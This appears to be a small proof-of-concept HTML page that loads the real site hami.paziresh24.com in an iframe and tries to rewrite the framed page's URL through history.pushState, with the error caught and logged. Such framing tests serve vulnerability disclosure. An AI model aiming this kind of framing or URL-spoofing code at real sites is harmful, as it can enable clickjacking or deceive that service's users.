<!DOCTYPE html>
<html>
<head>
    <title>PoC - iframe-parent-url.js</title>
</head>
<body>
    <iframe src="https://hami.paziresh24.com" width="100%" height="500"></iframe>
    <script>
        const iframe = document.querySelector('iframe');

        iframe.onload = function () {
            try {
                iframe.contentWindow.history.pushState({}, '', 'https://www.google.com');
            } catch (e) {
                console.log('Error:', e.message);
            }
        };
    </script>
</body>
</html>
